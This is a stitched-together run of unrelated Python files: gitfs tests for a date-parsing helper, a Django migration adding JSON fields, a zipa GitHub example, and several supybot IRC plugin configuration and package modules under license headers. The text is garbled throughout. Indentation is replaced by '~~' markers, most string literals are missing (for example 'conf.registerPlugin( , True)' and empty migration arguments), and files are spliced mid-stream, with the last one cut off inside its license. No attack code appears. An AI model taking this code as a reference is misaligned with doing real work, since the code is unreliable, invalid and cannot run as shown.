~~ mocked_repo . lookup_reference . has_calls ( [ call ( "HEAD" ) ] ) \n 
mocked_repo . walk . assert_called_once_with ( "head" , GIT_SORT_TIME ) \n 
assert mocked_repo . lookup_reference ( ) . resolve . call_count == 2 \n 
# Copyright 2014 PressLabs SRL \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ import pytest \n 
import datetime as dt \n 
\n 
from mock import MagicMock \n 
\n 
from gitfs . utils . strptime import TimeParser \n 
from gitfs . utils import strptime \n 
\n 
\n 
class TestDateTimeUtils ( object ) : \n 
\n 
~~~ def test_strptime ( self ) : \n 
~~~ date = dt . date ( 2014 , 8 , 21 ) \n 
datetime = dt . datetime ( 2014 , 8 , 21 , 1 , 2 , 3 ) \n 
assert strptime ( "2014-08-21 01:02:03" , "%Y-%m-%d %H:%M:%S" ) == date \n 
assert strptime ( "2014-08-21 01:02:03" , "%Y-%m-%d %H:%M:%S" , \n 
to_datetime = True ) == datetime \n 
\n 
date = dt . date ( 2014 , 8 , 30 ) \n 
datetime = dt . datetime ( 2014 , 8 , 30 , 1 , 2 , 3 ) \n 
assert strptime ( "30 Aug 14 01:02:03" , "%d %b %y %H:%M:%S" ) == date \n 
assert strptime ( "30 Aug 14 01:02:03" , "%d %b %y %H:%M:%S" , \n 
to_datetime = True ) == datetime \n 
\n 
date = dt . date ( 1970 , 1 , 1 ) \n 
datetime = dt . datetime ( 1970 , 1 , 1 , 13 , 30 ) \n 
assert strptime ( "1 Jan 70 1:30pm" , "%d %b %y %I:%M%p" ) == date \n 
assert strptime ( "1 Jan 70 1:30pm" , "%d %b %y %I:%M%p" , \n 
to_datetime = True ) == datetime \n 
\n 
with pytest . raises ( ValueError ) : \n 
~~~ strptime ( "31 Nov 14 01:02:03" , "%d %b %y %H:%M:%S" ) \n 
\n 
~~ ~~ def test_time_parser_match_with_value_error ( self ) : \n 
~~~ mocked_pattern = MagicMock ( ) \n 
mocked_pattern . match . return_value = False \n 
\n 
parser = TimeParser ( "%d %b %y %I:%M%p" ) \n 
parser . pattern = mocked_pattern \n 
\n 
with pytest . raises ( ValueError ) : \n 
~~~ parser . match ( "daytime" ) \n 
\n 
~~ mocked_pattern . match . assert_called_once_with ( "daytime" ) \n 
# Copyright (c) 2015 Presslabs SRL \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
# -*- coding: utf-8 -*- \n 
~~ ~~ from __future__ import unicode_literals \n 
\n 
from django . db import migrations \n 
import jsonfield . fields \n 
\n 
\n 
class Migration ( migrations . Migration ) : \n 
\n 
~~~ dependencies = [ \n 
( , ) , \n 
] \n 
\n 
operations = [ \n 
migrations . AddField ( \n 
model_name = , \n 
name = , \n 
field = jsonfield . fields . JSONField ( null = True , blank = True ) , \n 
) , \n 
migrations . AddField ( \n 
model_name = , \n 
name = , \n 
field = jsonfield . fields . JSONField ( null = True , blank = True ) , \n 
) , \n 
migrations . AddField ( \n 
model_name = , \n 
name = , \n 
field = jsonfield . fields . JSONField ( null = True , blank = True ) , \n 
) , \n 
] \n 
# -*- coding: utf-8 -*- \n 
# vim: ft=python:sw=4:ts=4:sts=4:et: \n 
~~ from zipa import api_github_com as github \n 
\n 
repos = github . orgs . django . repos \n 
\n 
for repo in repos [ { : , : } ] : \n 
~~~ print repo . name \n 
### \n 
# Copyright (c) 2005, Jeremiah Fincher \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#   * Redistributions of source code must retain the above copyright notice, \n 
#     this list of conditions, and the following disclaimer. \n 
#   * Redistributions in binary form must reproduce the above copyright notice, \n 
#     this list of conditions, and the following disclaimer in the \n 
#     documentation and/or other materials provided with the distribution. \n 
#   * Neither the name of the author of this software nor the name of \n 
#     contributors to this software may be used to endorse or promote products \n 
#     derived from this software without specific prior written consent. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
### \n 
\n 
~~ import supybot . conf as conf \n 
import supybot . registry as registry \n 
from supybot . i18n import PluginInternationalization , internationalizeDocstring \n 
_ = PluginInternationalization ( ) \n 
\n 
def configure ( advanced ) : \n 
# This will be called by supybot to configure this module.  advanced is \n 
# a bool that specifies whether the user identified themself as an advanced \n 
# user or not.  You should effect your configuration by manipulating the \n 
# registry as appropriate. \n 
~~~ from supybot . questions import expect , anything , something , yn \n 
conf . registerPlugin ( , True ) \n 
\n 
~~ Alias = conf . registerPlugin ( ) \n 
conf . registerGroup ( Alias , ) \n 
conf . registerGroup ( Alias , ) \n 
conf . registerGlobalValue ( Alias , , \n 
registry . String ( , _ ( """Regex which alias names must match in order to be valid""" \n 
# vim:set shiftwidth=4 softtabstop=4 expandtab textwidth=79: \n 
### \n 
# Copyright (c) 2010, Daniel Folkinshteyn \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#   * Redistributions of source code must retain the above copyright notice, \n 
#     this list of conditions, and the following disclaimer. \n 
#   * Redistributions in binary form must reproduce the above copyright notice, \n 
#     this list of conditions, and the following disclaimer in the \n 
#     documentation and/or other materials provided with the distribution. \n 
#   * Neither the name of the author of this software nor the name of \n 
#     contributors to this software may be used to endorse or promote products \n 
#     derived from this software without specific prior written consent. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
\n 
### \n 
\n 
import supybot . conf as conf \n 
import supybot . registry as registry \n 
\n 
try : \n 
~~~ from supybot . i18n import PluginInternationalization \n 
from supybot . i18n import internationalizeDocstring \n 
_ = PluginInternationalization ( ) \n 
~~ except : \n 
\n 
# without the i18n plugin \n 
~~~ _ = lambda x : x \n 
internationalizeDocstring = lambda x : x \n 
\n 
~~ def configure ( advanced ) : \n 
# This will be called by supybot to configure this module.  advanced is \n 
# a bool that specifies whether the user identified themself as an advanced \n 
# user or not.  You should effect your configuration by manipulating the \n 
# registry as appropriate. \n 
~~~ from supybot . questions import expect , anything , something , yn \n 
conf . registerPlugin ( , True ) \n 
\n 
\n 
~~ Conditional = conf . registerPlugin ( ) \n 
# This is where your configuration variables (if any) should go.  For example: \n 
\n 
#     registry.Boolean(False, """Help for someConfigVariableName.""")) \n 
\n 
\n 
# vim:set shiftwidth=4 tabstop=4 expandtab textwidth=79: \n 
### \n 
# Copyright (c) 2004, Jeremiah Fincher \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#   * Redistributions of source code must retain the above copyright notice, \n 
#     this list of conditions, and the following disclaimer. \n 
#   * Redistributions in binary form must reproduce the above copyright notice, \n 
#     this list of conditions, and the following disclaimer in the \n 
#     documentation and/or other materials provided with the distribution. \n 
#   * Neither the name of the author of this software nor the name of \n 
#     contributors to this software may be used to endorse or promote products \n 
#     derived from this software without specific prior written consent. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
### \n 
\n 
import supybot . conf as conf \n 
import supybot . registry as registry \n 
from supybot . i18n import PluginInternationalization , internationalizeDocstring \n 
_ = PluginInternationalization ( ) \n 
\n 
Filter = conf . registerPlugin ( ) \n 
conf . registerGroup ( Filter , ) \n 
conf . registerGlobalValue ( Filter . spellit , \n 
, registry . Boolean ( True , _ ( """Determines whether or not to\n    replace letters in the output of spellit.""" ) ) ) \n 
conf . registerGlobalValue ( Filter . spellit , \n 
, registry . Boolean ( True , _ ( """Determines whether or not\n    to replace punctuation in the output of spellit.""" ) ) ) \n 
conf . registerGlobalValue ( Filter . spellit , \n 
, registry . Boolean ( True , _ ( """Determines whether or not to\n    replace numbers in the output of spellit.""" ) ) ) \n 
conf . registerGroup ( Filter , ) \n 
conf . registerChannelValue ( Filter . shrink , , \n 
registry . PositiveInteger ( 4 , _ ( """Determines the minimum number of a letters\n    in a word before it will be shrunken by the shrink command/filter.""" ) ) ) \n 
\n 
def configure ( advanced ) : \n 
# This will be called by supybot to configure this module.  advanced is \n 
# a bool that specifies whether the user identified themself as an advanced \n 
# user or not.  You should effect your configuration by manipulating the \n 
# registry as appropriate. \n 
~~~ from supybot . questions import expect , anything , something , yn \n 
conf . registerPlugin ( , True ) \n 
\n 
# vim:set shiftwidth=4 softtabstop=4 expandtab textwidth=79: \n 
### \n 
# Copyright (c) 2005, Jeremiah Fincher \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#   * Redistributions of source code must retain the above copyright notice, \n 
#     this list of conditions, and the following disclaimer. \n 
#   * Redistributions in binary form must reproduce the above copyright notice, \n 
#     this list of conditions, and the following disclaimer in the \n 
#     documentation and/or other materials provided with the distribution. \n 
#   * Neither the name of the author of this software nor the name of \n 
#     contributors to this software may be used to endorse or promote products \n 
#     derived from this software without specific prior written consent. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
### \n 
\n 
~~ import supybot . conf as conf \n 
import supybot . registry as registry \n 
from supybot . i18n import PluginInternationalization , internationalizeDocstring \n 
_ = PluginInternationalization ( ) \n 
\n 
def configure ( advanced ) : \n 
# This will be called by supybot to configure this module.  advanced is \n 
# a bool that specifies whether the user identified themself as an advanced \n 
# user or not.  You should effect your configuration by manipulating the \n 
# registry as appropriate. \n 
~~~ from supybot . questions import expect , anything , something , yn \n 
conf . registerPlugin ( , True ) \n 
\n 
~~ Karma = conf . registerPlugin ( ) \n 
\n 
conf . registerChannelValue ( Karma , , \n 
registry . Boolean ( False , _ ( """Determines whether the bot will output shorter\n    versions of the karma output when requesting a single thing\'s karma.""" ) ) ) \n 
conf . registerChannelValue ( Karma , , \n 
registry . SpaceSeparatedListOfStrings ( [ ] , _ ( """A space separated list of\n    characters to increase karma.""" ) ) ) \n 
conf . registerChannelValue ( Karma , , \n 
registry . SpaceSeparatedListOfStrings ( [ ] , _ ( """A space separated list of\n    characters to decrease karma.""" ) ) ) \n 
conf . registerChannelValue ( Karma , , \n 
registry . Boolean ( False , _ ( """Determines whether the bot will reply with a\n    success message when something\'s karma is increased or decreased.""" ) ) ) \n 
conf . registerChannelValue ( Karma , , \n 
registry . Integer ( 3 , _ ( """Determines how many highest/lowest karma things\n    are shown when karma is called with no arguments.""" ) ) ) \n 
conf . registerChannelValue ( Karma , , \n 
registry . Integer ( 25 , _ ( """Determines how many karma things are shown when\n    the most command is called.""" ) ) ) \n 
conf . registerChannelValue ( Karma , , \n 
registry . Boolean ( False , _ ( """Determines whether users can adjust the karma\n    of their nick.""" ) ) ) \n 
conf . registerChannelValue ( Karma , , \n 
registry . Boolean ( True , _ ( """Determines whether the bot will\n    increase/decrease karma without being addressed.""" ) ) ) \n 
conf . registerChannelValue ( Karma , , \n 
registry . Boolean ( False , _ ( """Determines whether the bot will\n    only increase/decrease karma for nicks in the current channel.""" ) ) ) \n 
\n 
# vim:set shiftwidth=4 softtabstop=4 expandtab textwidth=79: \n 
### \n 
# Copyright (c) 2003-2005, Daniel DiPaolo \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#   * Redistributions of source code must retain the above copyright notice, \n 
#     this list of conditions, and the following disclaimer. \n 
#   * Redistributions in binary form must reproduce the above copyright notice, \n 
#     this list of conditions, and the following disclaimer in the \n 
#     documentation and/or other materials provided with the distribution. \n 
#   * Neither the name of the author of this software nor the name of \n 
#     contributors to this software may be used to endorse or promote products \n 
#     derived from this software without specific prior written consent. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
### \n 
\n 
"""\nMoobot factoid compatibility module.  Moobot\'s factoids were originally\ndesigned to emulate Blootbot\'s factoids, so in either case, you should find\nthis plugin comfortable.\n""" \n 
\n 
import supybot \n 
import supybot . world as world \n 
\n 
# Use this for the version of this plugin.  You may wish to put a CVS keyword \n 
\n 
__version__ = "0.1" \n 
\n 
__author__ = supybot . authors . strike \n 
\n 
# This is a dictionary mapping supybot.Author instances to lists of \n 
# contributions. \n 
__contributors__ = { } \n 
\n 
from . import config \n 
from . import plugin \n 
from imp import reload \n 
reload ( plugin ) \n 
# Add more reloads here if you add third-party modules and want them to be \n 
\n 
\n 
if world . testing : \n 
~~~ from . import test \n 
\n 
~~ Class = plugin . Class \n 
configure = config . configure \n 
\n 
\n 
# vim:set shiftwidth=4 softtabstop=8 expandtab textwidth=78: \n 
### \n 
# Copyright (c) 2004-2005, Jeremiah Fincher \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#   * Redistributions of source code must retain the above copyright notice, \n 
#     this list of conditions, and the following disclaimer. \n 
#   * Redistributions in binary form must reproduce the above copyright notice, \n 
#     this list of conditions, and the following disclaimer in the \n 
#     documentation and/or other materials provided with the distribution. \n 
#   * Neither the name of the author of this software nor the name of \n 
#     contributors to this software may be used to endorse or promote products \n 
#     derived from this software without specific prior written consent. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
### \n 
\n 
"""\nProvides commands useful to the owner of the bot; the commands here require\ntheir caller to have the \'owner\' capability.  This plugin is loaded by default.\n""" \n 
\n 
import supybot \n 
import supybot . world as world \n 
\n 
# Use this for the version of this plugin.  You may wish to put a CVS keyword \n 
\n 
__version__ = "%%VERSION%%" \n 
\n 
__author__ = supybot . authors . jemfinch \n 
\n 
# This is a dictionary mapping supybot.Author instances to lists of \n 
# contributions. \n 
__contributors__ = { } \n 
\n 
from . import config \n 
from . import plugin \n 
from imp import reload \n 
reload ( plugin ) \n 
\n 
if world . testing : \n 
~~~ from . import test \n 
\n 
~~ Class = plugin . Class \n 
configure = config . configure \n 
### \n 
# Copyright (c) 2005, Jeremiah Fincher \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#   * Redistributions of source code must retain the above copyright notice, \n 
#     this list of conditions, and the following disclaimer. \n 
#   * Redistributions in binary form must reproduce the above copyright notice, \n 
#     this list of conditions, and the following disclaimer in the \n 
#     documentation and/or other materials provided with the distribution. \n 
#   * Neither the name of the author of this software nor the name of \n 
#     contributors to this software may be used to endorse or promote products \n 
#     derived from this software without specific prior written consent. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
### \n 
\n 
"""\nProvides basic functionality for handling RSS/RDF feeds.\n""" \n 
\n 
import supybot \n 
import supybot . world as world \n 
\n 
# Use this for the version of this plugin.  You may wish to put a CVS keyword \n 
\n 
__version__ = "%%VERSION%%" \n 
\n 
__author__ = supybot . authors . jemfinch \n 
\n 
# This is a dictionary mapping supybot.Author instances to lists of \n 
# contributions. \n 
__contributors__ = { } \n 
\n 
from . import config \n 
from . import plugin \n 
from imp import reload \n 
reload ( plugin ) \n 
# Add more reloads here if you add third-party modules and want them to be \n 
\n 
\n 
if world . testing : \n 
~~~ from . import test \n 
\n 
~~ Class = plugin . Class \n 
configure = config . configure \n 
\n 
\n 
# vim:set shiftwidth=4 softtabstop=4 expandtab textwidth=79: \n 
### \n 
# Copyright (c) 2004, Jeremiah Fincher \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#   * Redistributions of source code must retain the above copyright notice, \n 
#     this list of conditions, and the following disclaimer. \n 
#   * Redistributions in binary form must reproduce the above copyright notice, \n 
#     this list of conditions, and the following disclaimer in the \n 
#     documentation and/or other materials provided with the distribution. \n 
#   * Neither the name of the author of this software nor the name of \n 
#     contributors to this software may be used to endorse or promote products \n 
#     derived from this software without specific prior written consent. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
### \n 
\n 
"""\nA simple module to handle various informational commands querying the bot\'s\ncurrent status and statistics.\n""" \n 
\n 
import supybot \n 
import supybot . world as world \n 
\n 
# Use this for the version of this plugin.  You may wish to put a CVS keyword \n 
\n 
__version__ = "%%VERSION%%" \n 
\n 
__author__ = supybot . authors . jemfinch \n 
\n 
# This is a dictionary mapping supybot.Author instances to lists of \n 
# contributions. \n 
__contributors__ = { } \n 
\n 
from . import config \n 
from . import plugin \n 
from imp import reload \n 
reload ( plugin ) \n 
\n 
if world . testing : \n 
~~~ from . import test \n 
\n 
~~ Class = plugin . Class \n 
configure = config . configure \n 
\n 
\n 
# vim:set shiftwidth=4 softtabstop=4 expandtab textwidth=79: \n 
### \n 
# Copyright (c) 2002-2005, Jeremiah Fincher \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#   * Redistributions of source code must retain the above copyright notice, \n 
#     this list of conditions, and the following disclaimer. \n 
#   * Redistributions in binary form must reproduce the above copyright notice, \n 
#     this list of conditions, and the following disclaimer in the \n 
#     documentation and/or other materials provided with the distribution. \n 
#   * Neither the name of the author of this software nor the name of \n 
#     contributors to this software may be used to endorse or promote products \n 
#     derived from this software without specific prior written consent. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF \n 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS \n 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN \n 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) \n 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n 
# POSSIBILITY OF SUCH DAMAGE. \n 
### \n 
\n 
"""\nProvides commands available only on Unix.\n""" \n 
\n 
import supybot \n 
import supybot . world as world \n 
\n 
# Use this for the version of this plugin.  You may wish to put a CVS keyword \n 
\n 
__version__ = "%%VERSION%%" \n 
\n 
__author__ = supybot . authors . jemfinch \n 
\n 
# This is a dictionary mapping supybot.Author instances to lists of \n 
# contributions. \n 
__contributors__ = { } \n 
\n 
# This is a url where the most recent plugin package can be downloaded. \n 
__url__ = \n 
\n 
from . import config \n 
from . import plugin \n 
from imp import reload \n 
reload ( plugin ) \n 
# Add more reloads here if you add third-party modules and want them to be \n 
\n 
\n 
if world . testing : \n 
~~~ from . import test \n 
\n 
~~ Class = plugin . Class \n 
configure = config . configure \n 
\n 
\n 
# vim:set shiftwidth=4 softtabstop=4 expandtab textwidth=79: \n 
## \n 
# Copyright (c) 2002-2004, Jeremiah Fincher \n 
# Copyright (c) 2010, 2013, James McCoy \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
#   * Redistributions of source code must retain the above copyright notice, \n 
#     this list of conditions, and the following disclaimer. \n 
#   * Redistributions in binary form must reproduce the above copyright notice, \n 
#     this list of conditions, and the following disclaimer in the \n 
#     documentation and/or other materials provided with the distribution. \n 
#   * Neither the name of the author of this software nor the name of \n 
#     contributors to this software may be used to endorse or promote products \n 
#     derived from this software without specific prior written consent. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \n 
# ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \n 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR \n 
